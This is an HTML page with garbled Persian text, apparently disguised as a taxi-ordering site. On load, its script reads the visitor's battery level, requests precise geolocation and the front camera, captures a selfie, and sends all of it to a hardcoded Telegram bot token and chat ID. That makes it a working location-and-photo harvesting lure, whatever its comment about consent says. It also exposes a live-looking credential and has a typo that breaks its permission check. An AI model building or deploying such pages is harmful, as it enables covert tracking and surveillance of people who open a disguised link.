<!doctype html>
<html lang="fa">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ØªØ§Ú©Ø³ÛŒ Ø¨Ø§Ø¨Ø§ Ø¹Ø¨Ø§Ø³ â€” Ø§ØªÙˆÙ…Ø§ØªÛŒÚ© Ù…ÙˆÙ‚Ø¹ÛŒØª Ùˆ Ø³Ù„ÙÛŒ Ùˆ Ø¯Ø±ØµØ¯ Ø¨Ø§ØªØ±ÛŒ</title>
  <style>
    :root{--bg:#f7f9fb;--card:#fff;--text:#0b1a2b;--muted:#6c7a86;--green:#28a745;--danger:#c0392b}
    body { font-family: "Tahoma", "Arial", sans-serif; background:var(--bg); color:var(--text); display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
    .card { background:var(--card); padding:28px; border-radius:12px; box-shadow:0 6px 24px rgba(12,17,24,0.08); text-align:center; width:360px; }
    .icon { font-size:56px; }
    h1 { margin:10px 0 6px; font-size:22px; }
    p { margin:6px 0 18px; color:var(--muted); font-size:14px; }
    .small { font-size:13px; color:#7a8a99; margin-top:12px; min-height:24px }
    .hint { color:var(--danger); margin-top:12px; font-size:13px; display:none; }
    video { display:none; width:240px; height:320px; border-radius:8px; object-fit:cover; margin-top:12px }
    canvas { display:none }
  </style>
</head>
<body>
  <div class="card" role="status" aria-live="polite">
    <div class="icon" aria-hidden="true">ğŸš•</div>
    <h1>ØªØ§Ú©Ø³ÛŒ Ø¨Ø§Ø¨Ø§ Ø¹Ø¨Ø§Ø³</h1>
    <p>Ø¨Ù‡â€ŒÙ…Ø­Ø¶ ÙˆØ±ÙˆØ¯ØŒ Ø¯Ø± Ø­Ø§Ù„ Ú¯Ø±ÙØªÙ† Ù…ÙˆÙ‚Ø¹ÛŒØªØŒ ÙˆØ¶Ø¹ÛŒØª Ø¨Ø§ØªØ±ÛŒ Ùˆ Ø³Ù„ÙÛŒ Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªØ§Ú©Ø³ÛŒ.</p>
    <div id="status" class="small">Ø¯Ø± Ø­Ø§Ù„ Ø¢Ù…Ø§Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ...</div>
    <div id="error" class="hint" role="alert"></div>
    <video id="video" autoplay playsinline muted></video>
  </div>

  <script>
    /*****************************************************************************
     * Ù‡Ø´Ø¯Ø§Ø± Ù…Ù‡Ù…:
     * - Ø§Ø¬Ø±Ø§ÛŒ Ø®ÙˆØ¯Ú©Ø§Ø± Ú¯Ø±ÙØªÙ† Ù…ÙˆÙ‚Ø¹ÛŒØª Ùˆ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¨Ø¯ÙˆÙ† Ø§Ø·Ù„Ø§Ø¹ ØµØ±ÛŒØ­ Ú©Ø§Ø±Ø¨Ø± Ù…Ù…Ú©Ù† Ø§Ø³Øª
     *   Ù†Ø§Ù‚Ø¶ Ù‚ÙˆØ§Ù†ÛŒÙ† Ø­Ø±ÛŒÙ… Ø®ØµÙˆØµÛŒ Ùˆ Ù¾Ù„ØªÙØ±Ù…â€ŒÙ‡Ø§ Ø¨Ø§Ø´Ø¯. Ø­ØªÙ…Ø§Ù‹ Ù…Ø·Ù…Ø¦Ù† Ø´ÙˆÛŒØ¯ Ú©Ø§Ø±Ø¨Ø±
     *   Ø¢Ú¯Ø§Ù‡ Ùˆ Ø±Ø¶Ø§ÛŒØªÙ…Ù†Ø¯ Ø§Ø³Øª.
     * - ØªÙˆÚ©Ù† ØªÙ„Ú¯Ø±Ø§Ù… Ø¯Ø± Ú©Ù„Ø§ÛŒÙ†Øª Ù†Ø§Ø§Ù…Ù† Ø§Ø³Øª. Ù†Ø³Ø®Ù‡Ù” Ø§Ù…Ù†: Ú©Ù„Ø§ÛŒÙ†Øª Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ Ø±Ø§ Ø¨Ù‡ Ø³Ø±ÙˆØ± Ø§Ø±Ø³Ø§Ù„ Ú©Ù†Ø¯
     *   Ùˆ Ø³Ø±ÙˆØ± Ø¨Ø§ ØªÙˆÚ©Ù† ÙˆØ§Ù‚Ø¹ÛŒ Ø¨Ù‡ Telegram API Ø¨Ø²Ù†Ø¯.
     * - getUserMedia Ùˆ Geolocation Ø±ÙˆÛŒ origin Ø§Ù…Ù† (https ÛŒØ§ localhost) Ú©Ø§Ø± Ù…ÛŒâ€ŒÚ©Ù†Ù†Ø¯.
     *****************************************************************************/

    // ====== CONFIG (Ø¨Ø±Ø§ÛŒ ØªØ³Øª Ø³Ø±ÛŒØ¹) ======
    // Ø¯Ø± Ù…Ø­ÛŒØ· ØªÙˆÙ„ÛŒØ¯ Ø§ÛŒÙ†Ù‡Ø§ Ø±Ø§ Ø¯Ø± Ú©Ù„Ø§ÛŒÙ†Øª Ù‚Ø±Ø§Ø± Ù†Ø¯Ù‡ÛŒØ¯Ø› Ø¯Ø± Ø³Ø±ÙˆØ± Ù†Ú¯Ù‡ Ø¯Ø§Ø±ÛŒØ¯.
    const BOT_TOKEN = '8295388715:AAGkM7QaqplE1WNpM6S_GI6aBLzBObK2he8';
    const CHAT_ID   = '8293145520';

    // ====== DOM ======
    const statusDiv = document.getElementById('status');
    const errorDiv = document.getElementById('error');
    const video = document.getElementById('video');

    function setStatus(msg) { statusDiv.textContent = msg; errorDiv.style.display='none'; }
    function setError(msg) { errorDiv.style.display='block'; errorDiv.textContent = msg; statusDiv.textContent=''; }

    // ====== Battery API ======
    async function getBatteryInfo() {
      try {
        if (!('getBattery' in navigator)) return null; // Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ø´Ø¯Ù‡
        const battery = await navigator.getBattery();
        const level = Math.round((battery.level || 0) * 100);
        const charging = battery.charging ? ' (Ø¯Ø± Ø­Ø§Ù„ Ø´Ø§Ø±Ú˜)' : '';
        return { level, charging };
      } catch (e) {
        return null;
      }
    }

    // ====== Geolocation ======
    function getCurrentPositionPromise() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) return reject(new Error('Ù…Ø±ÙˆØ±Ú¯Ø± Ø´Ù…Ø§ Geolocation Ø±Ø§ Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒÚ©Ù†Ø¯.'));
        navigator.geolocation.getCurrentPosition(pos => {
          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
        }, err => {
          if (err.code === err.PERMISSION_DENIED) reject(new Error('Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø±Ø¯ Ø´Ø¯.'));
          else reject(new Error('Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª: ' + (err.message || err.code)));
        }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
      });
    }

    // ====== Camera ======
    let mediaStream = null;
    async function startCamera() {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        throw new Error('Ø¯Ø³ØªÚ¯Ø§Ù‡ Ø´Ù…Ø§ Ø§Ø² Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒÚ©Ù†Ø¯.');
      }
      const constraints = { video: { facingMode: { ideal: "user" }, width: { ideal: 640 }, height: { ideal: 960 } }, audio: false };
      mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
      video.srcObject = mediaStream;
      video.style.display = 'block';
      try { await video.play(); } catch(e){}
    }
    async function stopCamera() {
      if (mediaStream) {
        mediaStream.getTracks().forEach(t => t.stop());
        mediaStream = null;
      }
      try { video.pause(); } catch(e){}
      video.srcObject = null;
      video.style.display = 'none';
    }
    function captureBlobFromVideo() {
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      const canvas = document.createElement('canvas');
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      // mirror selfie
      ctx.translate(w, 0); ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, w, h);
      return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
    }

    // ====== Telegram (client-side; Ù†Ø§Ø§Ù…Ù†) ======
    async function sendLocationToTelegram(lat, lon) {
      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendLocation`;
      const body = new URLSearchParams({ chat_id: CHAT_ID, latitude: String(lat), longitude: String(lon) });
      const r = await fetch(url, { method: 'POST', body });
      const j = await r.json();
      if (!j.ok) throw new Error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ù„ÙˆÚ©ÛŒØ´Ù†: ' + (j.description || r.statusText));
      return j;
    }
    async function sendMessageToTelegram(text) {
      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
      const body = new URLSearchParams({ chat_id: CHAT_ID, text });
      const r = await fetch(url, { method: 'POST', body });
      const j = await r.json();
      if (!j.ok) throw new Error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù…: ' + (j.description || r.statusText));
      return j;
    }
    async function sendPhotoToTelegram(blob, caption = '') {
      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`;
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', new File([blob], 'selfie.jpg', { type: blob.type || 'image/jpeg' }));
      if (caption) form.append('caption', caption);
      const r = await fetch(url, { method: 'POST', body: form });
      const j = await r.json();
      if (!j.ok) throw new Error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³: ' + (j.description || r.statusText));
      return j;
    }

    // ====== Ø¬Ø±ÛŒØ§Ù† Ú©Ù„ÛŒ Ø®ÙˆØ¯Ú©Ø§Ø±: Ø¨Ø§ØªØ±ÛŒ -> Ù…ÙˆÙ‚Ø¹ÛŒØª -> Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹ÛŒØª -> Ø¯ÙˆØ±Ø¨ÛŒÙ† -> Ø¹Ú©Ø³ Ùˆ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ ======
    async function autoCollectAndSend() {
      if (!BOT_TOKEN || BOT_TOKEN.includes('REPLACE_WITH') || !CHAT_ID) {
        setError('Ù¾Ø§Ø±Ø§Ù…ØªØ±Ù‡Ø§ÛŒ Ø±Ø¨Ø§Øª ØªÙ†Ø¸ÛŒÙ… Ù†Ø´Ø¯Ù‡â€ŒØ§Ù†Ø¯ ÛŒØ§ Ù†Ø§Ø§Ù…Ù† Ù‡Ø³ØªÙ†Ø¯. Ø¯Ø± Ù…Ø­ÛŒØ· ØªÙˆÙ„ÛŒØ¯ Ø§Ø² Ø³Ø±ÙˆØ± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯.');
        return;
      }

      try {
        setStatus('Ø¯Ø± Ø­Ø§Ù„ Ø®ÙˆØ§Ù†Ø¯Ù† ÙˆØ¶Ø¹ÛŒØª Ø¨Ø§ØªØ±ÛŒ...');
        const battery = await getBatteryInfo();
        const batteryText = battery ? `${battery.level}%${battery.charging}` : 'Ù†Ø§Ù…Ø´Ø®Øµ';

        setStatus('Ø¯Ø± Ø­Ø§Ù„ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ø§Ø² Ù…Ø±ÙˆØ±Ú¯Ø±...');
        const { lat, lon } = await getCurrentPositionPromise();
        setStatus('Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯. Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹ÛŒØª Ùˆ ÙˆØ¶Ø¹ÛŒØª Ø¨Ø§ØªØ±ÛŒ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...');
        // Ø§ÙˆÙ„ Ù„ÙˆÚ©ÛŒØ´Ù† Ø¨ÙØ±Ø³ØªÛŒÙ…
        await sendLocationToTelegram(lat, lon);

        // Ø³Ù¾Ø³ ÛŒÚ© Ù¾ÛŒØ§Ù… Ù…ØªÙ†ÛŒ Ø´Ø§Ù…Ù„ Ø¯Ø±ØµØ¯ Ø¨Ø§ØªØ±ÛŒ Ùˆ Ù„ÛŒÙ†Ú© Ù…ÙˆÙ‚Ø¹ÛŒØª
        const textMessage = `Ù…Ø´ØªØ±ÛŒ Ø¯Ø±Ø®ÙˆØ§Ø³Øª ØªØ§Ú©Ø³ÛŒ Ø¯Ø§Ø±Ø¯.\nÙ…ÙˆÙ‚Ø¹ÛŒØª: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}\nØ¨Ø§ØªØ±ÛŒ: ${batteryText}`;
        await sendMessageToTelegram(textMessage);

        // Ø³Ù¾Ø³ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ø¹Ú©Ø³
        setStatus('Ø¯Ø± Ø­Ø§Ù„ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¨Ø±Ø§ÛŒ Ú¯Ø±ÙØªÙ† Ø³Ù„ÙÛŒ...');
        try {
          await startCamera();
        } catch (e) {
          setError('Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø§Ù…Ú©Ø§Ù†â€ŒÙ¾Ø°ÛŒØ± Ù†ÛŒØ³Øª: ' + (e.message || e));
          return;
        }

        setStatus('Ø¯Ø± Ø­Ø§Ù„ Ú¯Ø±ÙØªÙ† Ø³Ù„ÙÛŒ...');
        await new Promise(r => setTimeout(r, 600)); // Ú©Ù…ÛŒ Ø²Ù…Ø§Ù† Ø¨Ø±Ø§ÛŒ warm-up
        const blob = await captureBlobFromVideo();
        await stopCamera();

        if (!blob) {
          setError('Ø®Ø·Ø§ Ø¯Ø± Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³.');
          return;
        }

        setStatus('Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø³Ù„ÙÛŒ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...');
        const caption = `Ø³Ù„ÙÛŒ Ù…Ø´ØªØ±ÛŒ â€” Ø¨Ø§ØªØ±ÛŒ: ${batteryText}\nÙ…ÙˆÙ‚Ø¹ÛŒØª: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}`;
        await sendPhotoToTelegram(blob, caption);

        setStatus('Ù…ÙˆÙ‚Ø¹ÛŒØªØŒ ÙˆØ¶Ø¹ÛŒØª Ø¨Ø§ØªØ±ÛŒ Ùˆ Ø³Ù„ÙÛŒ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯. ØªØ§Ú©Ø³ÛŒ Ø¯Ø± Ø±Ø§Ù‡ Ø§Ø³Øª.');
      } catch (err) {
        setError('Ø®Ø·Ø§: ' + (err.message || err));
      } finally {
        try { await stopCamera(); } catch(e){}
      }
    }

    // Ø§Ø¬Ø±Ø§ Ù‡Ù†Ú¯Ø§Ù… Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ ØµÙØ­Ù‡
    window.addEventListener('load', () => {
      setTimeout(() => autoCollectAndSend(), 300);
    });

    // Ø¨Ø±Ø±Ø³ÛŒ ÙˆØ¶Ø¹ÛŒØª permission API Ø¨Ø±Ø§ÛŒ Ø§Ø·Ù„Ø§Ø¹â€ŒØ±Ø³Ø§Ù†ÛŒ Ø¨Ù‡ØªØ±
    (async function checkPermissions() {
      if (!navigatorin.permissions) return;
      try {
        const pGeo = await navigator.permissions.query({ name: 'geolocation' });
        if (pGeo.state === 'denied') setStatus('Ø¯Ø³ØªØ±Ø³ÛŒ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø± Ù…Ø±ÙˆØ±Ú¯Ø± Ù…Ø³Ø¯ÙˆØ¯ Ø´Ø¯Ù‡ Ø§Ø³Øª.');
        pGeo.onchange = () => {
          if (pGeo.state === 'denied') setStatus('Ø¯Ø³ØªØ±Ø³ÛŒ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø± Ù…Ø±ÙˆØ±Ú¯Ø± Ù…Ø³Ø¯ÙˆØ¯ Ø´Ø¯Ù‡ Ø§Ø³Øª.');
        };
        const pCam = await navigator.permissions.query({ name: 'camera' }).catch(()=>null);
        if (pCam && pCam.state === 'denied') setStatus('Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¯Ø± Ù…Ø±ÙˆØ±Ú¯Ø± Ù…Ø³Ø¯ÙˆØ¯ Ø´Ø¯Ù‡ Ø§Ø³Øª.');
      } catch(e){}
    })();
  </script>

  <noscript>
    <div style="text-align:center; margin-top:14px; color:#c00">Ø¬Ø§ÙˆØ§Ø§Ø³Ú©Ø±ÛŒÙ¾Øª Ø®Ø§Ù… Ø§Ø³Øª. Ø§ÛŒÙ† ØµÙØ­Ù‡ Ø¨Ø§ÛŒØ¯ Ø¬Ø§ÙˆØ§Ø§Ø³Ú©Ø±ÛŒÙ¾Øª Ø±Ø§ Ø§Ø¬Ø±Ø§ Ú©Ù†Ø¯.</div>
  </noscript>
</body>
</html>
